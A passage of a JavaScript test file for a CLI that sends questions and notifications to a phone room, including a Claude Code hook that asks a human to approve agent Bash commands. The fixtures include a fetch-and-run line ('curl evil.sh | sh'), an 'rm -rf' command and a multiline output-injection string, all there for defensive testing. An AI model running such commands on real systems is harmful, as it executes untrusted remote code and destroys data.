    const header = /^([A-Za-z0-9_-]+)<<(.+)$/.exec(lines[i]);
    assert.ok(header, `invalid GitHub output header: ${lines[i]}`);
    const [, name, delimiter] = header;
    i += 1;
    const valueLines = [];
    while (i < lines.length && lines[i] !== delimiter) {
      valueLines.push(lines[i]);
      i += 1;
    }
    assert.equal(lines[i], delimiter, `missing delimiter for ${name}`);
    i += 1;
    outputs[name] = valueLines.join('\n');
  }
  return outputs;
}

test('github output protocol contains malicious multiline answers without output injection', async () => {
  const maliciousAnswer = 'ok\nstate=acked\r\nanswer=owned\npingroom_0123456789abcdef\nEOF_like';
  const { server, baseUrl } = await questionServer({
    'POST /api/agent/handoffs': () => ({
      status: 201,
      body: { id: 'h_malicious', kind: 'question', state: 'pending' },
    }),
    'GET /api/agent/handoffs/h_malicious/wait': () => ({
      status: 200,
      body: {
        id: 'h_malicious',
        kind: 'question',
        state: 'answered',
        answer: { value: maliciousAnswer, label: 'Untrusted' },
      },
    }),
  });
  const dir = mkdtempSync(join(tmpdir(), 'pingroom-cli-output-'));
  const outputPath = join(dir, 'github-output');
  try {
    const { status, stdout, stderr } = await runAsync([
      'handoff', '--token', 'tok', '--api', baseUrl, '--wait',
      '--github-output', outputPath, '-m', 'Ship?', '--question', '-o', 'ok:OK', '-o', 'hold:Hold',
    ]);
    assert.equal(status, 0, stderr);

    // Preserve the normal key=value stdout contract for non-Action callers.
    assert.match(stdout, /answer=ok\nstate=acked\r\nanswer=owned/);

    const raw = readFileSync(outputPath, 'utf8');
    assert.match(raw, /^handoff-id<<pingroom_[0-9a-f]{48}$/m);
    const outputs = parseGitHubOutputFile(raw);
    assert.deepEqual(Object.keys(outputs).sort(), ['answer', 'handoff-id', 'state']);
    assert.equal(outputs['handoff-id'], 'h_malicious');
    assert.equal(outputs.state, 'answered');
    assert.equal(outputs.answer, maliciousAnswer);
  } finally {
    server.close();
    rmSync(dir, { recursive: true, force: true });
  }
});

test('handoffs lists recent history with state=all without changing question list', async () => {
  const { server, baseUrl, received } = await questionServer({
    'GET /api/agent/handoffs': () => ({ status: 200, body: { handoffs: [
      { id: 'h_done', kind: 'question', state: 'answered', prompt: 'Ship?', answer: { value: 'hold' } },
      { id: 'h_open', kind: 'ack', state: 'open', prompt: 'Review this' },
    ] } }),
  });
  try {
    const { status, stdout } = await runAsync([
      'handoffs', '--token', 'tok', '--api', baseUrl, '--state', 'all',
    ]);
    assert.equal(status, 0);
    assert.match(stdout, /h_done\s+question\s+answered\s+Ship\? → hold/);
    assert.match(stdout, /h_open\s+ack\s+open\s+Review this/);
    assert.equal(received[0].path, '/api/agent/handoffs');
    assert.match(received[0].query, /(?:^|&)state=all(?:&|$)/);
  } finally {
    server.close();
  }
});

test('handoffs defaults to open and rejects question-only states', async () => {
  const { server, baseUrl, received } = await questionServer({
    'GET /api/agent/handoffs': () => ({ status: 200, body: { handoffs: [] } }),
  });
  try {
    const open = await runAsync(['handoffs', '--token', 'tok', '--api', baseUrl]);
    assert.equal(open.status, 0);
    assert.equal(open.stdout.trim(), 'no handoffs');
    assert.match(received[0].query, /(?:^|&)state=open(?:&|$)/);
  } finally {
    server.close();
  }

  const invalid = run(['handoffs', '--token', 'tok', '--state', 'answered']);
  assert.equal(invalid.status, 2);
  assert.match(invalid.stderr, /--state must be 'open' or 'all'/);
});

test('exit 2: handoff without --message', () => {
  const { status, stderr } = run(['handoff', '--token', 't']);
  assert.equal(status, 2);
  assert.match(stderr, /--message is required/);
});

test('exit 2: handoff without a token', () => {
  const { status, stderr } = run(['handoff', '-m', 'Ack?']);
  assert.equal(status, 2);
  assert.match(stderr, /agent token is required/);
});

test('exit 2: handoff --question needs at least 2 options', () => {
  const { status, stderr } = run(['handoff', '--token', 't', '-m', 'x', '--question', '-o', 'only:One']);
  assert.equal(status, 2);
  assert.match(stderr, /at least 2 --option/);
});

test('exit 2: handoff --option without --question is still a question (needs 2)', () => {
  // A single --option implies a question but falls short of the 2-option floor.
  const { status, stderr } = run(['handoff', '--token', 't', '-m', 'x', '-o', 'solo']);
  assert.equal(status, 2);
  assert.match(stderr, /at least 2 --option/);
});

test('exit 2: handoff rejects more than 4 options', () => {
  const { status, stderr } = run([
    'handoff', '--token', 't', '-m', 'x', '--question',
    '-o', 'one', '-o', 'two', '-o', 'three', '-o', 'four', '-o', 'five',
  ]);
  assert.equal(status, 2);
  assert.match(stderr, /at most 4 --option/);
});

test('exit 2: handoff bad --urgency', () => {
  const { status, stderr } = run(['handoff', '--token', 't', '-m', 'x', '--urgency', 'loud']);
  assert.equal(status, 2);
  assert.match(stderr, /--urgency must be/);
});

test('exit 2: handoff --expires-in out of range', () => {
  const { status, stderr } = run(['handoff', '--token', 't', '-m', 'x', '--expires-in', '5']);
  assert.equal(status, 2);
  assert.match(stderr, /between 120 and 86400/);
});

test('handoff ack (no --wait) posts kind=ack and prints machine-readable output', async () => {
  const { server, baseUrl, received } = await questionServer({
    'POST /api/agent/handoffs': () => ({ status: 201, body: { id: 'h_1', state: 'open', delivery_state: 'enqueued' } }),
  });
  try {
    const { status, stdout } = await runAsync([
      'handoff', '--token', 'tok', '--api', baseUrl, '-m', 'Ack to proceed',
    ]);
    assert.equal(status, 0);
    assert.match(stdout, /^id=h_1$/m);
    assert.match(stdout, /^state=open$/m);
    assert.match(stdout, /^delivery-state=enqueued$/m);
    assert.equal(received[0].method, 'POST');
    assert.equal(received[0].path, '/api/agent/handoffs');
    assert.equal(received[0].auth, 'Bearer tok');
    assert.deepEqual(JSON.parse(received[0].body), {
      kind: 'ack', prompt: 'Ack to proceed', audience: { type: 'direct', user_id: 'me' },
    });
  } finally {
    server.close();
  }
});

test('handoff sends the Idempotency-Key header and full question body', async () => {
  let idemHeader;
  const { server, baseUrl, received } = await questionServer({
    'POST /api/agent/handoffs': () => ({ status: 201, body: { id: 'h_2', state: 'pending', delivery_state: 'pending' } }),
  });
  // questionServer doesn't capture arbitrary headers, so wrap to grab it.
  server.removeAllListeners('request');
  server.on('request', (req, res) => {
    let body = '';
    req.on('data', (c) => (body += c));
    req.on('end', () => {
      idemHeader = req.headers['idempotency-key'];
      received.push({ method: req.method, path: req.url.split('?')[0], auth: req.headers['authorization'], body });
      res.writeHead(201, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ id: 'h_2', state: 'pending', delivery_state: 'pending' }));
    });
  });
  try {
    const { status } = await runAsync([
      'handoff', '--token', 'tok', '--api', baseUrl, '-m', 'Ship 1.4.0?',
      '--question', '-o', 'deploy:Deploy', '-o', 'hold:Hold',
      '--target', 'u-123', '--expires-in', '600', '--urgency', 'passive',
      '--idempotency-key', 'key-abc', '--correlation-id', 'corr-9', '--reply-to', 'r-1',
      '-d', '{"pr":42}',
    ]);
    assert.equal(status, 0);
    assert.equal(idemHeader, 'key-abc');
    assert.deepEqual(JSON.parse(received[0].body), {
      kind: 'question', prompt: 'Ship 1.4.0?',
      audience: { type: 'direct', user_id: 'u-123' },
      options: [{ value: 'deploy', label: 'Deploy' }, { value: 'hold', label: 'Hold' }],
      expires_in: 600, urgency: 'passive',
      correlation_id: 'corr-9', reply_to: 'r-1', data: { pr: 42 },
    });
  } finally {
    server.close();
  }
});

test('handoff --wait exits 0 on acked and prints acked-by', async () => {
  const { server, baseUrl } = await questionServer({
    'POST /api/agent/handoffs': () => ({ status: 201, body: { id: 'h_3', state: 'open', delivery_state: 'enqueued' } }),
    'GET /api/agent/handoffs/h_3/wait': () => ({ status: 200, body: { id: 'h_3', state: 'acked', delivery_state: null, acked_by: { id: 'u-7', display_name: 'Maya' }, acked_at: '2026-07-12T00:00:00Z' } }),
  });
  const dir = mkdtempSync(join(tmpdir(), 'pingroom-cli-delivery-state-'));
  const outputPath = join(dir, 'github-output');
  try {
    const { status, stdout } = await runAsync([
      'handoff', '--token', 'tok', '--api', baseUrl, '--wait',
      '--github-output', outputPath, '-m', 'Ack?',
    ]);
    assert.equal(status, 0);
    assert.match(stdout, /^state=acked$/m);
    assert.match(stdout, /^delivery-state=enqueued$/m);
    assert.match(stdout, /^acked-by=u-7$/m);
    const outputs = parseGitHubOutputFile(readFileSync(outputPath, 'utf8'));
    assert.equal(outputs['delivery-state'], 'enqueued');
  } finally {
    server.close();
    rmSync(dir, { recursive: true, force: true });
  }
});

test('handoff --wait --json preserves the raw terminal response', async () => {
  const terminal = { id: 'h_json', state: 'acked', delivery_state: null, acked_by: { id: 'u-8' } };
  const { server, baseUrl } = await questionServer({
    'POST /api/agent/handoffs': () => ({
      status: 201,
      body: { id: 'h_json', state: 'open', delivery_state: 'enqueued' },
    }),
    'GET /api/agent/handoffs/h_json/wait': () => ({ status: 200, body: terminal }),
  });
  try {
    const { status, stdout, stderr } = await runAsync([
      'handoff', '--token', 'tok', '--api', baseUrl, '--wait', '--json', '-m', 'Ack?',
    ]);
    assert.equal(status, 0, stderr);
    assert.deepEqual(JSON.parse(stdout), terminal);
  } finally {
    server.close();
  }
});

test('handoff prints an empty acked-by when the server redacts the actor id', async () => {
  const { server, baseUrl } = await questionServer({
    'POST /api/agent/handoffs': () => ({ status: 201, body: { id: 'h_redacted', state: 'open' } }),
    'GET /api/agent/handoffs/h_redacted/wait': () => ({ status: 200, body: { id: 'h_redacted', state: 'acked', acked_by: { id: null, display_name: null } } }),
  });
  try {
    const { status, stdout } = await runAsync([
      'handoff', '--token', 'tok', '--api', baseUrl, '--wait', '-m', 'Ack?',
    ]);
    assert.equal(status, 0);
    assert.match(stdout, /^acked-by=$/m);
    assert.doesNotMatch(stdout, /\[object Object\]/);
  } finally {
    server.close();
  }
});

test('handoff --wait exits 0 on a NEGATIVE answer (hold is not a failure)', async () => {
  const { server, baseUrl } = await questionServer({
    'POST /api/agent/handoffs': () => ({ status: 201, body: { id: 'h_4', state: 'pending' } }),
    'GET /api/agent/handoffs/h_4/wait': () => ({ status: 200, body: { id: 'h_4', state: 'answered', answer: { value: 'hold', label: 'Hold' } } }),
  });
  try {
    const { status, stdout } = await runAsync([
      'handoff', '--token', 'tok', '--api', baseUrl, '--wait',
      '-m', 'Ship?', '--question', '-o', 'deploy:Deploy', '-o', 'hold:Hold',
    ]);
    assert.equal(status, 0);
    assert.match(stdout, /^state=answered$/m);
    assert.match(stdout, /^answer=hold$/m);
  } finally {
    server.close();
  }
});

test('handoff --wait exits 3 on expiry', async () => {
  const { server, baseUrl } = await questionServer({
    'POST /api/agent/handoffs': () => ({ status: 201, body: { id: 'h_5', state: 'open' } }),
    'GET /api/agent/handoffs/h_5/wait': () => ({ status: 200, body: { id: 'h_5', state: 'expired' } }),
  });
  try {
    const { status, stdout } = await runAsync([
      'handoff', '--token', 'tok', '--api', baseUrl, '--wait', '-m', 'Ack?',
    ]);
    assert.equal(status, 3);
    assert.match(stdout, /^state=expired$/m);
  } finally {
    server.close();
  }
});

test('handoff exits 4 on 409 recipient_not_ready', async () => {
  const { server, baseUrl } = await questionServer({
    'POST /api/agent/handoffs': () => ({ status: 409, body: { code: 'recipient_not_ready', message: 'no device' } }),
  });
  try {
    const { status, stderr } = await runAsync([
      'handoff', '--token', 'tok', '--api', baseUrl, '-m', 'Ack?',
    ]);
    assert.equal(status, 4);
    assert.match(stderr, /recipient not ready/);
  } finally {
    server.close();
  }
});

test('handoff exits 1 on a generic server error', async () => {
  const { server, baseUrl } = await questionServer({
    'POST /api/agent/handoffs': () => ({ status: 503, body: { code: 'capability_check_unavailable', message: 'down' } }),
  });
  try {
    const { status, stderr } = await runAsync([
      'handoff', '--token', 'tok', '--api', baseUrl, '-m', 'Ack?',
    ]);
    assert.equal(status, 1);
    assert.match(stderr, /handoff failed/);
  } finally {
    server.close();
  }
});

// ---------------------------------------------------------------------------
// hook — Claude Code integration
// ---------------------------------------------------------------------------

/** Run the CLI with a hook event piped to stdin, resolving on close. */
function runHook(args, stdin, env = {}) {
  return new Promise((resolve, reject) => {
    const child = spawn(process.execPath, [CLI, 'hook', ...args], {
      env: { ...baseEnv(), ...env },
    });
    let stdout = '';
    let stderr = '';
    child.stdout.on('data', (c) => (stdout += c));
    child.stderr.on('data', (c) => (stderr += c));
    child.on('error', reject);
    child.on('close', (status) => resolve({ status, stdout, stderr }));
    child.stdin.end(typeof stdin === 'string' ? stdin : JSON.stringify(stdin ?? {}));
  });
}

test('hook --print-config prints a pasteable settings.json with the pinned version', async () => {
  const { status, stdout } = await runHook(['--print-config'], '');
  assert.equal(status, 0);
  assert.match(stdout, /~\/\.claude\/settings\.json/);
  assert.match(stdout, /"PreToolUse"/);
  assert.match(stdout, /"matcher": "Bash"/);
  assert.match(stdout, /npx --yes @pingroom\/cli@0\.7\.2 hook/);
  assert.match(stdout, /stored credential and paired room automatically/);
  assert.doesNotMatch(stdout, /^#\s+export PINGROOM_TOKEN/m);
});

test('hook Stop pings the room with the last assistant message', async () => {
  const dir = mkdtempSync(join(tmpdir(), 'pingroom-cli-transcript-'));
  const transcript = join(dir, 'session.jsonl');
  const lines = [
    JSON.stringify({ type: 'user', message: { role: 'user', content: 'hi' } }),
    JSON.stringify({ type: 'assistant', message: { role: 'assistant', content: [{ type: 'text', text: 'Refactored auth module, 3 files changed.' }] } }),
  ].join('\n');
  const { writeFileSync } = await import('node:fs');
  writeFileSync(transcript, lines);

  const { server, baseUrl, received } = await questionServer({
    'POST /api/agent/rooms/ab12cd/notifications': () => ({ status: 201, body: { id: 'n1' } }),
  });
  try {
    const event = { hook_event_name: 'Stop', session_id: 's-1', cwd: '/work', transcript_path: transcript };
    const { status, stderr } = await runHook(
      ['--api', baseUrl], event,
      { PINGROOM_TOKEN: 'tok', PINGROOM_ROOM: 'ab12cd' },
    );
    assert.equal(status, 0, stderr);
    assert.equal(received[0].path, '/api/agent/rooms/ab12cd/notifications');
    assert.equal(received[0].auth, 'Bearer tok');
    const body = JSON.parse(received[0].body);
    assert.equal(body.title, 'Claude finished');
    assert.equal(body.message, 'Refactored auth module, 3 files changed.');
    assert.equal(body.correlation_id, 's-1');
    assert.deepEqual(body.data, { event: 'Stop', session_id: 's-1', cwd: '/work' });
  } finally {
    server.close();
    rmSync(dir, { recursive: true, force: true });
  }
});

test('hook uses the QR-paired credential and room without environment variables', async () => {
  const home = mkdtempSync(join(tmpdir(), 'pingroom-hook-home-'));
  const { server, baseUrl, received } = await questionServer({
    'POST /api/agent/rooms/PAIRED42/notifications': () => ({ status: 201, body: { id: 'n1' } }),
  });
  writeFileSync(join(home, 'credentials.json'), `${JSON.stringify({
    version: 1,
    token: 'paired_token',
    api_url: baseUrl,
    room: { invite_code: 'PAIRED42', name: 'Paired room' },
  })}\n`, { mode: 0o600 });

  try {
    const { status, stderr } = await runHook([], { hook_event_name: 'Stop' }, { PINGROOM_HOME: home });
    assert.equal(status, 0);
    assert.match(stderr, /pinged/);
    assert.equal(received.length, 1);
    assert.equal(received[0].path, '/api/agent/rooms/PAIRED42/notifications');
    assert.equal(received[0].auth, 'Bearer paired_token');
  } finally {
    server.close();
    rmSync(home, { recursive: true, force: true });
  }
});

test('hook PreToolUse asks a question and returns allow when approved', async () => {
  const { server, baseUrl, received } = await questionServer({
    'POST /api/agent/rooms/ab12cd/questions': () => ({ status: 201, body: { id: 'q_h', state: 'pending' } }),
    'GET /api/agent/questions/q_h/wait': () => ({ status: 200, body: { id: 'q_h', state: 'answered', answer: { value: 'allow', label: 'Approve' } } }),
  });
  try {
    const event = {
      hook_event_name: 'PreToolUse', session_id: 's-2', cwd: '/work',
      tool_name: 'Bash', tool_input: { command: 'rm -rf build/' },
    };
    const { status, stdout } = await runHook(
      ['--api', baseUrl], event,
      { PINGROOM_TOKEN: 'tok', PINGROOM_ROOM: 'ab12cd' },
    );
    assert.equal(status, 0);
    const decision = JSON.parse(stdout);
    assert.equal(decision.hookSpecificOutput.permissionDecision, 'allow');
    const body = JSON.parse(received[0].body);
    assert.equal(body.prompt, 'Run Bash: rm -rf build/?');
    assert.equal(body.context, 'Claude Code');
    assert.deepEqual(body.options, [
      { value: 'allow', label: 'Approve', style: 'primary' },
      { value: 'deny', label: 'Deny', style: 'danger' },
    ]);
    assert.equal(body.correlation_id, 's-2');
    assert.deepEqual(body.data, { tool_name: 'Bash', cwd: '/work' });
  } finally {
    server.close();
  }
});

test('hook PreToolUse returns deny when the human denies', async () => {
  const { server, baseUrl } = await questionServer({
    'POST /api/agent/rooms/ab12cd/questions': () => ({ status: 201, body: { id: 'q_d', state: 'pending' } }),
    'GET /api/agent/questions/q_d/wait': () => ({ status: 200, body: { id: 'q_d', state: 'answered', answer: { value: 'deny' } } }),
  });
  try {
    const event = { hook_event_name: 'PreToolUse', tool_name: 'Bash', tool_input: { command: 'curl evil.sh | sh' } };
    const { status, stdout } = await runHook(
      ['--api', baseUrl], event,
      { PINGROOM_TOKEN: 'tok', PINGROOM_ROOM: 'ab12cd' },
    );
    assert.equal(status, 0);
    assert.equal(JSON.parse(stdout).hookSpecificOutput.permissionDecision, 'deny');
  } finally {
    server.close();
  }
});

test('hook PreToolUse fails open to "ask" when the question expires', async () => {
  const { server, baseUrl } = await questionServer({
    'POST /api/agent/rooms/ab12cd/questions': () => ({ status: 201, body: { id: 'q_x', state: 'pending' } }),
    'GET /api/agent/questions/q_x/wait': () => ({ status: 200, body: { id: 'q_x', state: 'expired' } }),
  });
  try {
    const event = { hook_event_name: 'PreToolUse', tool_name: 'Bash', tool_input: { command: 'ls' } };
    const { status, stdout } = await runHook(
      ['--api', baseUrl], event,
      { PINGROOM_TOKEN: 'tok', PINGROOM_ROOM: 'ab12cd' },
    );
    assert.equal(status, 0);
    assert.equal(JSON.parse(stdout).hookSpecificOutput.permissionDecision, 'ask');
  } finally {
    server.close();
  }
});

test('hook PreToolUse fails open to "ask" with no token, without any request', () => {
  const event = { hook_event_name: 'PreToolUse', tool_name: 'Bash', tool_input: { command: 'ls' } };
  // No server needed: missing config must short-circuit before any network call.
  // EMPTY_HOME for the same reason every other test uses it — this one inherits
  // process.env directly, so without it the developer's own ~/.pingroom
  // credential leaks in and the "no config" path is never exercised (it asks a
  // real human a real question instead).
  const r = spawnSync(process.execPath, [CLI, 'hook'], {
    input: JSON.stringify(event),
    env: (() => {
      const e = { ...process.env, PINGROOM_HOME: EMPTY_HOME };
      delete e.PINGROOM_TOKEN;
      delete e.PINGROOM_ROOM;
      return e;
    })(),
    encoding: 'utf8',
  });
  assert.equal(r.status, 0);
  assert.equal(JSON.parse(r.stdout).hookSpecificOutput.permissionDecision, 'ask');
});

test('hook Notification skips permission-style duplicates but pings idle prompts', async () => {
  const { server, baseUrl, received } = await questionServer({
    'POST /api/agent/rooms/ab12cd/notifications': () => ({ status: 201, body: { id: 'n2' } }),
  });
  try {
    const permission = { hook_event_name: 'Notification', message: 'Claude needs your permission to use Bash' };
    const skipped = await runHook(['--api', baseUrl], permission, { PINGROOM_TOKEN: 'tok', PINGROOM_ROOM: 'ab12cd' });
    assert.equal(skipped.status, 0);
    assert.equal(received.length, 0);

    const idle = { hook_event_name: 'Notification', message: 'Claude is waiting for your input' };
    const pinged = await runHook(['--api', baseUrl], idle, { PINGROOM_TOKEN: 'tok', PINGROOM_ROOM: 'ab12cd' });
    assert.equal(pinged.status, 0);
    assert.equal(received.length, 1);
    assert.equal(JSON.parse(received[0].body).message, 'Claude is waiting for your input');
  } finally {
    server.close();
  }
});

test('hook notify events never fail the agent when the ping errors', async () => {
  const { server, baseUrl } = await questionServer({
    'POST /api/agent/rooms/ab12cd/notifications': () => ({ status: 500, body: { message: 'boom' } }),
  });
  try {
    const event = { hook_event_name: 'Stop' };
    const { status, stderr } = await runHook(['--api', baseUrl], event, { PINGROOM_TOKEN: 'tok', PINGROOM_ROOM: 'ab12cd' });
    assert.equal(status, 0);
    assert.match(stderr, /hook ping failed/);
  } finally {
    server.close();
  }
});

// `hook` was the only command that attached a bearer without running its API
// base through requireSafeUrl, so a config or env pointing at plain http shipped
// `Authorization: Bearer …` in the clear with nothing on screen. It enforces the
// same rule now, but by deferring rather than exiting — the hook must never
// break the agent. The distinctive "cleartext" wording proves the refusal came
// from the gate and not from a DNS failure downstream of it.
test('hook refuses a cleartext API base instead of sending the token over it', async () => {
  const env = { PINGROOM_TOKEN: 'tok', PINGROOM_ROOM: 'ab12cd' };
  const cleartext = 'http://cleartext.invalid';

  const notify = await runHook(['--api', cleartext], { hook_event_name: 'Stop' }, env);
  assert.equal(notify.status, 0);
  assert.match(notify.stderr, /hook skipped .*cleartext/);
  assert.doesNotMatch(notify.stderr, /pinged/);

  const gate = await runHook(
    ['--api', cleartext],
    { hook_event_name: 'PreToolUse', tool_name: 'Bash', tool_input: { command: 'ls' } },
    env,
  );
  assert.equal(gate.status, 0);
  const decision = JSON.parse(gate.stdout).hookSpecificOutput;
  assert.equal(decision.permissionDecision, 'ask');
  assert.match(decision.permissionDecisionReason, /cleartext/);
});

test('hook still accepts an http loopback base, like every other command', async () => {
  const { server, baseUrl, received } = await questionServer({
    'POST /api/agent/rooms/ab12cd/notifications': () => ({ status: 201, body: { id: 'n3' } }),
  });
  try {
    assert.match(baseUrl, /^http:\/\/(127\.0\.0\.1|localhost)/);
    const { status } = await runHook(['--api', baseUrl], { hook_event_name: 'Stop' }, {
      PINGROOM_TOKEN: 'tok',
      PINGROOM_ROOM: 'ab12cd',
    });
    assert.equal(status, 0);
    assert.equal(received.length, 1);
  } finally {
    server.close();
  }
});

test('hook fails open without sending when a stored credential is redirected to another origin', async () => {
  const home = newHome();
  const { server, baseUrl, received } = await questionServer({
    'POST /api/agent/rooms/ab12cd/notifications': () => ({ status: 201, body: { id: 'n-never' } }),
    'POST /api/agent/rooms/ab12cd/questions': () => ({ status: 201, body: { id: 'q-never' } }),
  });
  seedCredential(home, {
    token: 'paired_tok',
    api_url: 'https://issuer.example.test',
    room: { invite_code: 'ab12cd' },
  });

  try {
    const env = { PINGROOM_HOME: home };
    const notify = await runHook(['--api', baseUrl], { hook_event_name: 'Stop' }, env);
    assert.equal(notify.status, 0);
    assert.match(notify.stderr, /hook skipped .*stored credential is bound/);

    const gate = await runHook(
      ['--api', baseUrl],
      { hook_event_name: 'PreToolUse', tool_name: 'Bash', tool_input: { command: 'ls' } },
      env,
    );
    assert.equal(gate.status, 0);
    const decision = JSON.parse(gate.stdout).hookSpecificOutput;
    assert.equal(decision.permissionDecision, 'ask');
    assert.match(decision.permissionDecisionReason, /stored credential is bound/);
    assert.match(decision.permissionDecisionReason, /--token or PINGROOM_TOKEN/);
    assert.equal(received.length, 0, 'the stored bearer must never reach the override origin');
  } finally {
    server.close();
    rmSync(home, { recursive: true, force: true });
  }
});

// ---------------------------------------------------------------------------
// live — live-status streams
// ---------------------------------------------------------------------------

test('exit 2: live needs a subcommand', () => {
  const { status, stderr } = run(['live', '-c', 'x']);
  assert.equal(status, 2);
  assert.match(stderr, /live needs a subcommand/);
});

test('exit 2: live requires a correlation id', () => {
  const { status, stderr } = run(['live', 'start']);
  assert.equal(status, 2);
  assert.match(stderr, /--correlation-id is required/);
});

test('exit 2: live rejects re-templating on update', () => {
  const { status, stderr } = run(['live', 'update', '-c', 'x', '--template', 'metrics']);
  assert.equal(status, 2);
  assert.match(stderr, /fixed at stream creation/);
});

test('exit 2: live validates --progress bounds', () => {
  const { status, stderr } = run(['live', 'update', '-c', 'x', '--progress', '5']);
  assert.equal(status, 2);
  assert.match(stderr, /--progress must be at most 1/);
});

test('exit 2: live validates the --steps label count', () => {
  const { status, stderr } = run(['live', 'start', '-c', 'x', '--steps', 'only-one']);
  assert.equal(status, 2);
  assert.match(stderr, /between 2 and 8/);
});

test('live start posts a steps stream to the agent route', async () => {
  const received = [];
  const { server, baseUrl } = await startServer((req, res) => {
    let body = '';
    req.on('data', (c) => (body += c));
    req.on('end', () => {
      received.push({ method: req.method, url: req.url, auth: req.headers.authorization, body });
      res.writeHead(201, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ notification_id: 'n1', correlation_id: 'rel-1', state: 'started' }));
    });
  });
  try {
    const { status, stdout } = await runAsync([
      'live', 'start', '--token', 'tok', '--room', 'ab12cd', '--api', baseUrl,
      '-c', 'rel-1', '--template', 'steps', '--steps', 'Build, Test ,Ship', '-t', 'Deploy',
    ]);
    assert.equal(status, 0);
    assert.match(stdout, /live start → started/);
    assert.equal(received.length, 1);
    assert.equal(received[0].url, '/api/agent/rooms/ab12cd/live');
    assert.equal(received[0].auth, 'Bearer tok');
    assert.deepEqual(JSON.parse(received[0].body), {
      correlation_id: 'rel-1',
      live_status: { state: 'running', template: 'steps', steps: ['Build', 'Test', 'Ship'] },
      title: 'Deploy',
    });
  } finally {
    server.close();
  }
});

test('live end sends a terminal ping, and --failed flips the state', async () => {
  const received = [];
  const { server, baseUrl } = await startServer((req, res) => {
    let body = '';
    req.on('data', (c) => (body += c));
    req.on('end', () => {
      received.push(JSON.parse(body));
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ state: 'done' }));
    });
  });
  try {
    await runAsync(['live', 'end', '--token', 't', '--room', 'r', '--api', baseUrl, '-c', 'c1', '-m', 'Shipped']);
    await runAsync(['live', 'end', '--token', 't', '--room', 'r', '--api', baseUrl, '-c', 'c1', '--failed']);

    assert.equal(received[0].live_status.state, 'done');
    assert.equal(received[0].live_status.message, 'Shipped');
    assert.equal(received[1].live_status.state, 'failed');
  } finally {
    server.close();
  }
});

test('live works through a room webhook without a token', async () => {
  const received = [];
  const { server, baseUrl } = await startServer((req, res) => {
    let body = '';
    req.on('data', (c) => (body += c));
    req.on('end', () => {
      received.push({ url: req.url, body: JSON.parse(body) });
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ success: true, live_status: { state: 'running' } }));
    });
  });
  try {
    const { status } = await runAsync([
      'live', 'update', '-w', `${baseUrl}/api/webhooks/ab12cd/secret`,
      '-c', 'c2', '--progress', '0.7', '--metric', 'RPS:1.2k',
    ]);
    assert.equal(status, 0);
    assert.equal(received[0].url, '/api/webhooks/ab12cd/secret');
    assert.deepEqual(received[0].body.live_status, {
      state: 'running', progress: 0.7, metrics: [{ label: 'RPS', value: '1.2k' }],
    });
  } finally {
    server.close();
  }
});

test('live start expresses the question template via --option', async () => {
  const received = [];
  const { server, baseUrl } = await startServer((req, res) => {
    let body = '';
    req.on('data', (c) => (body += c));
    req.on('end', () => {
      received.push(JSON.parse(body));
      res.writeHead(201, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ state: 'started' }));
    });
  });
  try {
    // A bare token is both value and label; the first colon splits the rest.
    // `--accent-override` normalizes a bare hex back to `#rrggbb` so a shell
    // that ate an unquoted `#` still produces a valid payload.
    const { status } = await runAsync([
      'live', 'start', '--token', 't', '--room', 'r', '--api', baseUrl,
      '-c', 'q1', '--template', 'question', '--prompt', 'Deploy where?',
      '--option', 'prod:Production', '--option', 'staging',
      '--accent-override', 'E33122',
    ]);
    assert.equal(status, 0);
    assert.deepEqual(received[0].live_status, {
      state: 'running',
      prompt: 'Deploy where?',
      template: 'question',
      options: [
        { value: 'prod', label: 'Production' },
        { value: 'staging', label: 'staging' },
      ],
      accent_override: '#e33122',
    });
  } finally {
    server.close();
  }
});

test('live start expresses the matchup template via --left/--right/--center', async () => {
  const received = [];
  const { server, baseUrl } = await startServer((req, res) => {
    let body = '';
    req.on('data', (c) => (body += c));
    req.on('end', () => {
      received.push(JSON.parse(body));
      res.writeHead(201, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ state: 'started' }));
    });
  });
  try {
    const { status } = await runAsync([
      'live', 'start', '--token', 't', '--room', 'r', '--api', baseUrl,
      '-c', 'm1', '--template', 'matchup',
      '--left', 'ARS:2', '--right', 'CHE:1', '--center', "68'",
    ]);
    assert.equal(status, 0);
    assert.deepEqual(received[0].live_status, {
      state: 'running',
      template: 'matchup',
      left: { label: 'ARS', value: '2' },
      right: { label: 'CHE', value: '1' },
      center: "68'",
    });
  } finally {
    server.close();
  }
});

test('live rejects malformed --option, --left, and --accent-override', async () => {
  const bad = [
    [['--option', ':nope'], /--option needs a value/],
    [['--left', 'ARS'], /--left must be "label:value"/],
    [['--right', 'CHE'], /--right must be "label:value"/],
    [['--accent-override', 'nothex'], /6-digit hex color/],
  ];
  for (const [extra, pattern] of bad) {
    const { status, stderr } = await runAsync([
      'live', 'start', '--token', 't', '--room', 'r', '--api', 'https://example.com',
      '-c', 'c1', ...extra,
    ]);
    assert.equal(status, 2);
    assert.match(stderr, pattern);
  }
});

test('live get reads a stream back and prints its state', async () => {
  const { server, baseUrl } = await startServer((req, res) => {
    assert.equal(req.method, 'GET');
    assert.equal(req.url, '/api/agent/rooms/ab12cd/live/c3');
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ state: 'running', progress: 0.5 }));
  });
  try {
    const { status, stdout } = await runAsync([
      'live', 'get', '--token', 't', '--room', 'ab12cd', '--api', baseUrl, '-c', 'c3',
    ]);
    assert.equal(status, 0);
    assert.equal(stdout.trim(), 'running');
  } finally {
    server.close();
  }
});

test('live surfaces the free-tier quota rejection', async () => {
  const { server, baseUrl } = await startServer((req, res) => {
    res.writeHead(402, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ code: 'free_limit_reached', message: 'Free accounts can start 5 live streams per day.' }));
  });
  try {
    const { status, stderr } = await runAsync([
      'live', 'start', '--token', 't', '--room', 'r', '--api', baseUrl, '-c', 'c4',
    ]);
    assert.equal(status, 1);
    assert.match(stderr, /live start failed: Free accounts can start 5/);
  } finally {
    server.close();
  }
});

test('exit 2: live rejects an unknown --category', () => {
  const { status, stderr } = run(['live', 'start', '-c', 'x', '--category', 'urgent']);
  assert.equal(status, 2);
  assert.match(stderr, /--category must be status, steps or alert/);
});

// --category was validated locally but --template was not, so a typo left the
